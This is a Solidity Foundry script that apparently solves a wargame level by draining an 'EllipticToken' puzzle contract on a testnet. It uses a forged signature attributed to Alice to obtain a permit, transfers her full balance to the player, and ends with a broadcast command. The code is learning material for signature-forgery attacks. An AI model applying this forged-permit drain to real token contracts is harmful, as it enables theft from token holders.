// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {IEllipticToken} from "../src/level35.sol";

contract Level35Script is Script {
    function run() external {
        address instanceAddress = 0x77336EB67ef2d46E44Afe494f95665a52ED5a8a8;
        address alice = 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e;

        string
            memory forgedAmountHex = "0xe6938106569a648c2f02493b2a4a0aa098ceed801d43acc5e9f25b79c708edd7";
        string
            memory forgedAliceSigHex = "0xaecb25a1d0cb98c1c914fdb128bb75e547302b285b3c717cf1c747ef52b8cd4d1f92b74989e4872fcefc535cfc67844f959b1d66c3f03802f9fdc313866393bf1c";

        uint256 forgedAmount = vm.parseUint(forgedAmountHex);
        bytes memory forgedAliceSig = vm.parseBytes(forgedAliceSigHex);
        address player = msg.sender;
        vm.startBroadcast();

        bytes32 permitAcceptHash = keccak256(
            abi.encodePacked(alice, player, forgedAmount)
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(permitAcceptHash);
        bytes memory playerSig = abi.encodePacked(r, s, v);

        IEllipticToken target = IEllipticToken(instanceAddress);

        console.log("Forged Amount to permit:", forgedAmount);
        target.permit(forgedAmount, player, forgedAliceSig, playerSig);

        target.transferFrom(alice, player, target.balanceOf(alice));

        vm.stopBroadcast();
    }
}
//forge script script/level35.s.sol:Level35Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account mytestkey -vvvv --sender 0x0ADf707838CDc0aBd5Cc361A9C680CEe4487F148
